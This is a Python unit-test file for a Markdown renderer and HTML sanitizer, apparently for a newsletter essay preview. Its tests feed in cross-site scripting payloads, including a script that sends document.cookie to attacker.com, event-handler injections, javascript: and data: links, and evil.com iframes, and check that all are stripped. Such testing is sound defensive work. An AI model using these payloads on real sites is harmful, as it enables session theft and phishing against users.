"""
Unit tests for Markdown rendering and strict HTML sanitization.
Verifies server-side sanitization policy, script blocking, unsafe URL rejection,
and preservation of legitimate semantic markup and formatting.
"""
from __future__ import annotations

from backend.app.writing.html_renderer import (
    render_markdown_to_safe_html,
    sanitize_html,
    ALLOWED_TAGS,
    ALLOWED_ATTRIBUTES,
    ALLOWED_URL_SCHEMES,
)


def test_render_markdown_basic_elements():
    md = (
        "# Title 1\n\n"
        "## Subtitle 2\n\n"
        "This is **bold**, *italic*, and [link](https://example.com).\n\n"
        "- Item 1\n- Item 2\n\n"
        "> Quote from guest"
    )
    html = render_markdown_to_safe_html(md, include_styles=False)

    assert "<h1>Title 1</h1>" in html
    assert "<h2>Subtitle 2</h2>" in html
    assert "<strong>bold</strong>" in html
    assert "<em>italic</em>" in html
    assert '<a href="https://example.com"' in html
    assert 'rel="noopener noreferrer"' in html
    assert "<ul>" in html
    assert "<blockquote>" in html


def test_sanitize_strips_scripts_and_event_handlers():
    malicious_md = (
        "# Safe Heading\n\n"
        "<script>alert('pwned')</script>\n\n"
        "<img src=x onerror=alert(1)>\n\n"
        "<a href=\"javascript:alert('xss')\">Malicious Link</a>\n\n"
        "<div onclick=\"stealData()\">Click me</div>"
    )
    html = render_markdown_to_safe_html(malicious_md, include_styles=False)

    # Confirm raw script, onerror, and javascript: links are stripped
    assert "<script>" not in html
    assert "alert('pwned')" not in html
    assert "onerror" not in html
    assert "javascript:" not in html
    assert "onclick" not in html
    assert "stealData" not in html


def test_safe_tables_rendered():
    table_md = (
        "| Metric | Value |\n"
        "| --- | --- |\n"
        "| Retention | 85% |\n"
        "| Churn | 2% |"
    )
    html = render_markdown_to_safe_html(table_md, include_styles=False)

    assert "<table>" in html
    assert "<th>Metric</th>" in html
    assert "<td>Retention</td>" in html
    assert "<td>85%</td>" in html


def test_scoped_styles_included():
    html = render_markdown_to_safe_html("# Title", include_styles=True)
    assert "<style>" in html
    assert ".lenny-essay-preview" in html
    assert "<h1>Title</h1>" in html


# ==============================================================================
# Focused HTML Security and Snippet Sanitization Tests
# ==============================================================================


def test_sanitize_html_direct_snippet_preserves_legitimate_content():
    """Verify that pure HTML snippets preserve headings, paragraphs, lists, and tables."""
    raw_html = (
        "<h1>Growth Loop Blueprint</h1>"
        "<p>Retention drives sustainable acquisition in product-led growth.</p>"
        "<ul>"
        "<li>Identify core value moment</li>"
        "<li>Remove signup friction</li>"
        "</ul>"
        "<table>"
        "<thead><tr><th>Stage</th><th>Benchmark</th></tr></thead>"
        "<tbody><tr><td>Activation</td><td>40%</td></tr></tbody>"
        "</table>"
        "<a href=\"https://www.lennysnewsletter.com\" title=\"Lenny Newsletter\">Read More</a>"
    )
    clean = sanitize_html(raw_html, include_styles=False)

    assert "<h1>Growth Loop Blueprint</h1>" in clean
    assert "<p>Retention drives sustainable acquisition in product-led growth.</p>" in clean
    assert "<ul>" in clean
    assert "<li>Identify core value moment</li>" in clean
    assert "<table>" in clean
    assert "<th>Stage</th>" in clean
    assert "<td>Activation</td>" in clean
    assert '<a href="https://www.lennysnewsletter.com"' in clean
    assert 'title="Lenny Newsletter"' in clean
    assert 'rel="noopener noreferrer"' in clean


def test_sanitize_html_blocks_malicious_scripts_and_events():
    """Verify that malicious tags and event handlers are strictly removed from HTML snippets."""
    malicious_html = (
        "<h2>Safe Heading</h2>"
        "<script>window.location='https://attacker.com?steal=' + document.cookie;</script>"
        "<p onmouseover=\"alert('hover')\">Text with hover exploit</p>"
        "<div onclick=\"fetch('/api/v1/sessions')\">Clickable bait</div>"
        "<img src=\"x\" onerror=\"alert('image exploit')\">"
        "<svg onload=\"alert('svg exploit')\"></svg>"
    )
    clean = sanitize_html(malicious_html, include_styles=False)

    assert "<h2>Safe Heading</h2>" in clean
    assert "<script" not in clean
    assert "document.cookie" not in clean
    assert "onmouseover" not in clean
    assert "onclick" not in clean
    assert "onerror" not in clean
    assert "onload" not in clean
    assert "<svg" not in clean
    assert "<img" not in clean


def test_sanitize_html_blocks_iframes_and_embeds():
    """Verify that <iframe>, <object>, and <embed> tags cannot be inserted into artifacts."""
    embedded_html = (
        "<h1>Document with Embeds</h1>"
        "<iframe src=\"https://evil.com/phishing\" width=\"500\" height=\"300\"></iframe>"
        "<object data=\"https://evil.com/payload.swf\"></object>"
        "<embed src=\"https://evil.com/payload.swf\">"
    )
    clean = sanitize_html(embedded_html, include_styles=False)

    assert "<h1>Document with Embeds</h1>" in clean
    assert "<iframe" not in clean
    assert "https://evil.com/phishing" not in clean
    assert "<object" not in clean
    assert "<embed" not in clean


def test_sanitize_html_strips_dangerous_url_schemes():
    """Verify that javascript:, data:, vbscript:, and file: schemes are blocked."""
    unsafe_links = (
        "<a href=\"javascript:alert(document.domain)\">Run JS</a>"
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Data URI</a>"
        "<a href=\"vbscript:msgbox(1)\">VBScript</a>"
        "<a href=\"file:///etc/passwd\">Local file</a>"
        "<a href=\"https://legit.com/article\">Legit URL</a>"
    )
    clean = sanitize_html(unsafe_links, include_styles=False)

    assert "javascript:" not in clean
    assert "data:text/html" not in clean
    assert "vbscript:" not in clean
    assert "file:///" not in clean
    # The legitimate URL must remain
    assert '<a href="https://legit.com/article"' in clean
    assert 'rel="noopener noreferrer"' in clean


def test_sanitize_html_empty_or_whitespace():
    """Verify empty input returns a safe fallback container."""
    assert sanitize_html("", include_styles=False) == '<div class="lenny-essay-preview"><p></p></div>'
    assert sanitize_html("   \n\t  ", include_styles=False) == '<div class="lenny-essay-preview"><p></p></div>'
